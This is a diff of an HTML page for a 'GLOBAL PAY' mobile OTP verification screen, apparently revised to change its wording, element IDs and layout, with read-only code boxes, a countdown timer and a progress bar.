@@ -5,7 +5,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
-<title>Verify Mobile Number</title>
+<title>OTP Verification</title>
 
 <link rel="stylesheet" href="otp.css">
 
@@ -13,7 +13,7 @@
 
 <body>
 
-<div class="main">
+<div class="bgGlow"></div>
 
 <div class="card">
 
@@ -21,39 +21,45 @@
 GLOBAL PAY
 </div>
 
-<h1>Verify Mobile Number</h1>
+<h1>
+Verify Mobile Number
+</h1>
 
 <p class="sub">
-Please wait while we verify your account.
+A secure verification code has been sent to your registered mobile number.
 </p>
 
-<div class="number" id="phoneNumber">
-+91
+<div class="mobile" id="mobile">
++91 **********
 </div>
 
-<div class="otpBoxes">
+<div class="otpArea">
 
-<input id="b1" readonly>
-<input id="b2" readonly>
-<input id="b3" readonly>
-<input id="b4" readonly>
-<input id="b5" readonly>
-<input id="b6" readonly>
+<input id="o1" readonly>
+<input id="o2" readonly>
+<input id="o3" readonly>
+<input id="o4" readonly>
+<input id="o5" readonly>
+<input id="o6" readonly>
 
 </div>
 
-<div class="progress">
+<div class="loading">
 
-<div class="bar">
-<div id="barFill"></div>
+<div class="line">
+
+<div id="progress"></div>
+
 </div>
 
 </div>
 
 <div class="timer">
 
-<span id="count">
+<span id="time">
+
 30
+
 </span>
 
 Seconds Remaining
@@ -62,9 +68,13 @@ Seconds Remaining
 
 <div class="status" id="status">
 
-Waiting for OTP...
+Waiting for secure OTP...
 
 </div>
+
+<div class="footer">
+
+Please don't close this page while verification is in progress.
 
 </div>
 
@@ -73,4 +83,5 @@ Waiting for OTP...
 <script src="otp.js"></script>
 
 </body>
+
 </html>
